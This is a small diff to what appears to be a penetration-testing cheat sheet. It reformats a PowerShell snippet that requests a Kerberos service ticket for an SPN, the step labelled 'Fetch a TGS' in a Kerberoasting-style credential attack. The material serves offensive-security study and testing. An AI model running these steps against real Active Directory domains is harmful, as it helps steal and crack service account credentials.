@@ -107,7 +107,8 @@ Be careful when transfering the ticket as it's binary and might get mangled.
 
 1. Fetch a TGS for an SPN
 ```powershell
-Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'
+Add-Type -AssemblyName System.IdentityModel 
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'
 ```
 
 2. Confirm it's loaded into memory
